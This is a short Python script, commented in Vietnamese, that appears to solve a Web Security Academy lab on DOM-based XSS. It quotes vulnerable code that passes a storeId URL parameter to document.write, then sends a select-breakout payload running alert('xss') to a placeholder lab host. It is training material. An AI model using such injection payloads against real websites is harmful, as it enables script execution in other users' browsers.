# Tương tự lab3 , lab4 cũng xảy ra lỗi đối với cách xử lý dữ liệu nhập vào hàm document.write
# Dưới đây là đoạn mã gây ra lỗi
# ```
# var stores = ["London","Paris","Milan"];
# var store = (new URLSearchParams(window.location.search)).get('storeId');
# document.write('<select name="storeId">');
# if(store) {
#     document.write('<option selected>'+store+'</option>');
# }
# for(var i=0;i<stores.length;i++) {
#     if(stores[i] === store) {
#         continue;
#     }
#     document.write('<option>'+stores[i]+'</option>');
# }
# document.write('</select>');
# ```

import requests

burp0_url = "https://YOUR_HOST.web-security-academy.net:443/product?productId=1&storeId="
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}

payload="</option></select><script>alert('xss')</script>"
requests.get(burp0_url+payload, headers=burp0_headers)